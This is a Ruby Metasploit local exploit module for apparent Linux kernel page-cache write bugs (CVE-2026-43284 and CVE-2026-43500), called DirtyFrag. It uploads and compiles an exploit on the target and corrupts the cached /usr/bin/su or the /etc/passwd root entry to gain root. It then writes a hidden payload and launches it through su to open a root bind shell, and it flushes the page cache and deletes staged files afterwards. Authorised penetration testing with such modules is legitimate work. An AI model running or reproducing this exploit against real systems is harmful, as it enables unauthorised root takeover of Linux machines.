##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Linux DirtyFrag Local Privilege Escalation',
        'Description'    => %q{
          This module exploits two related Linux kernel page-cache write-primitive bugs
          (CVE-2026-43284 and CVE-2026-43500) to escalate from any unprivileged user to root.

          ── Attack Path 1 — DirtyFrag ESP (CVE-2026-43284) ──────────────────────────
          Abuses XFRM ESN replay-state to perform 4-byte arbitrary writes into cached
          file pages via the ESP/UDP encapsulation decryption path. Corrupts the first
          192 bytes of /usr/bin/su's page-cache with a static x86_64 root-shell ELF.
          Requires: CLONE_NEWUSER|CLONE_NEWNET (unprivileged userns).

          ── Attack Path 2 — DirtyFrag RxRPC (CVE-2026-43500) ───────────────────────
          Uses AF_RXRPC and rxkad challenge/response to trigger an in-place
          pcbc(fcrypt) decrypt at an arbitrary file offset. Offline brute-force finds
          a session key that decrypts /etc/passwd's root entry to "::0:0:", clearing
          the root password. Requires: rxrpc.ko (default on Ubuntu, no userns needed).

          AUTO mode tries: DirtyFrag ESP → DirtyFrag RxRPC.

          IMPORTANT: After exploitation the page cache is contaminated. The module
          automatically issues `echo 3 > /proc/sys/vm/drop_caches` on success (Cleanup=true).
        },
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Hyunwoo Kim (@v4bel)',              # DirtyFrag discovery and original PoC
          'msf module author',                 # Metasploit module
        ],
        'References'     => [
          ['CVE', '2026-43284'],
          ['CVE', '2026-43500'],
          ['URL', 'https://github.com/V4bel/dirtyfrag'],
          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4'],
          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aa54b1d27fe0c2b78e664a34fd0fdf7cd1960d71'],
        ],
        'Platform'       => 'linux',
        'Arch'           => [ARCH_X86_64],
        'SessionTypes'   => ['shell', 'meterpreter'],
        'Targets'        => [
          ['Auto (ESP → RxRPC)', {}],
          ['DirtyFrag ESP only (--force-esp)',     { 'ForceEsp'   => true }],
          ['DirtyFrag RxRPC only (--force-rxrpc)', { 'ForceRxrpc' => true }],
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => '2026-05-07',
        'DefaultOptions' => {
          'WfsDelay' => 300,
          'PAYLOAD'  => 'linux/x64/shell_bind_tcp',
          'LPORT'    => 4444
        },
        'Notes'          => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [REPEATABLE_SESSION],
          'SideEffects'  => [
            ARTIFACTS_ON_DISK,
            CONFIG_CHANGES,
          ],
        }
      )
    )

    register_options([
      OptString.new('WritableDir', [true, 'Writable directory on target for staging', '/tmp']),
      OptBool.new('Cleanup',       [true, 'Drop page cache and remove staged files after exploit', true]),
      OptBool.new('Verbose',       [false, 'Stream exploit stage output through the session', false]),
      OptInt.new('MaxItersMG',     [false, 'Cap RxRPC brute-force (millions; 0 = binary default ~10B)', 0]),
    ])

    register_advanced_options([
      OptString.new('CompilerPath', [false, 'Path to gcc on the target (auto-detected if blank)', '']),
    ])
  end

  def check
    return CheckCode::Safe("Already running as root") if is_root?

    kernel = (get_sysinfo['kernel'] rescue nil) || cmd_exec('uname -r').strip
    vprint_status("Target kernel: #{kernel}")

    unless kernel.match?(/^\d+\./)
      return CheckCode::Unknown("Could not determine kernel version")
    end

    major, minor = kernel.split('.').first(2).map(&:to_i)
    if major > 6 || (major == 6 && minor >= 20)
      return CheckCode::Safe("Kernel #{kernel} is likely patched (>= 6.20)")
    end

    arch = cmd_exec('uname -m 2>/dev/null').strip
    vprint_status("Target arch: #{arch}")

    unless arch == 'x86_64'
      return CheckCode::Safe("DirtyFrag requires x86_64 architecture")
    end

    CheckCode::Appears("Kernel #{kernel} / arch #{arch} — appears vulnerable")
  end

  def exploit
    fail_with(Failure::None, "Already running as root") if is_root?

    writable_dir = datastore['WritableDir'].chomp('/')
    staged_files = []

    tarch = cmd_exec('uname -m 2>/dev/null').strip
    unless tarch == 'x86_64'
      fail_with(Failure::NoTarget, "DirtyFrag exp.c requires x86_64 (target is #{tarch}).")
    end

    # ── upload & compile exp.c ─────────────────────────────────────────
    exp_src = "#{writable_dir}/df_#{Rex::Text.rand_text_alphanumeric(6)}.c"
    exp_bin = exp_src.sub(/\.c$/, '')
    staged_files.push(exp_src, exp_bin)

    print_status("Uploading DirtyFrag source (#{exp_c_source.length} bytes) → #{exp_src}")
    write_file(exp_src, exp_c_source)
    fail_with(Failure::Unknown, "Source upload failed") unless file_exist?(exp_src)

    gcc = resolve_gcc
    print_status("Compiling: #{gcc} -O0 -Wall -o #{exp_bin} #{exp_src} -lutil")
    compile_out = cmd_exec("#{gcc} -O0 -Wall -o '#{exp_bin}' '#{exp_src}' -lutil 2>&1")
    unless file_exist?(exp_bin)
      fail_with(Failure::NotVulnerable, "Compilation failed:\n#{compile_out}")
    end
    print_good("Compiled successfully → #{exp_bin}")

    # ── build env + flags ──────────────────────────────────────────────
    env_vars = []
    flags = []

    flags << '--force-esp' if target.name.include?('ESP') && !target.name.start_with?('Auto')
    flags << '--force-rxrpc' if target.name.include?('RxRPC') && !target.name.start_with?('Auto')
    flags << '--verbose' if datastore['Verbose']

    max_iters = datastore['MaxItersMG'].to_i
    env_vars << "LPE_MAX_ITERS=#{max_iters * 1_000_000}" if max_iters > 0

    env_prefix = env_vars.join(' ')
    flag_args = flags.join(' ')

    # ── run corruption stage ───────────────────────────────────────────
    corrupt_cmd = "#{env_prefix} DIRTYFRAG_CORRUPT_ONLY=1 '#{exp_bin}' #{flag_args} 2>&1".strip
    print_status("Running DirtyFrag corruption: #{corrupt_cmd}")
    print_status("(RxRPC brute-force may take minutes — WfsDelay=#{datastore['WfsDelay']}s)")

    output = cmd_exec(corrupt_cmd, nil, datastore['WfsDelay'])
    vprint_status("DirtyFrag output:\n#{output}")

    unless corruption_verified?
      fail_with(Failure::NoAccess,
        "Page-cache corruption not confirmed — neither /usr/bin/su nor /etc/passwd was patched.\n" \
        "Output:\n#{output}")
    end

    print_good(su_patched? ? "/usr/bin/su page-cache patched with root-shell ELF" :
                             "/etc/passwd root entry patched (empty password, uid=0)")

    drop_payload_shell(writable_dir, staged_files)

  ensure
    if datastore['Cleanup']
      print_status("Cleanup: flushing page cache and removing staged files")
      cmd_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null; true')
      staged_files.each { |f| cmd_exec("rm -f '#{f}' 2>/dev/null; true") } if staged_files
    end
  end

  private

  def su_patched?
    cmd_exec("dd if=/usr/bin/su bs=1 skip=120 count=2 2>/dev/null | od -An -tx1").include?('31 ff')
  end

  def passwd_patched?
    cmd_exec('head -c 9 /etc/passwd 2>/dev/null').start_with?('root::0:0')
  end

  def corruption_verified?
    su_patched? || passwd_patched?
  end

  def resolve_gcc
    forced = datastore['CompilerPath'].to_s.strip
    return forced unless forced.empty?

    %w[gcc cc].each do |cc|
      path = cmd_exec("which #{cc} 2>/dev/null").strip
      return path unless path.empty? || path.include?('no ')
    end
    fail_with(Failure::NotFound, "No C compiler found on target. Install gcc or set CompilerPath.")
  end

  def drop_payload_shell(writable_dir, staged_files)
    payload_path = "#{writable_dir}/.#{Rex::Text.rand_text_alphanumeric(8)}"
    staged_files << payload_path
    print_status("Writing payload ELF to #{payload_path}")

    write_file(payload_path, generate_payload_exe)
    cmd_exec("chmod +x '#{payload_path}'")

    print_status("Launching payload via su (expecting root callback)...")
    cmd_exec("echo '' | su -c '#{payload_path}' root 2>/dev/null &")
    print_good("Payload launched — awaiting session callback")
  end

  def exp_c_source
    @exp_c_source ||= begin
      src_path = ::File.join(::File.dirname(__FILE__), 'exp.c')
      unless ::File.exist?(src_path)
        fail_with(Failure::NotFound, "exp.c not found at #{src_path}.")
      end
      ::File.read(src_path)
    end
  end
end
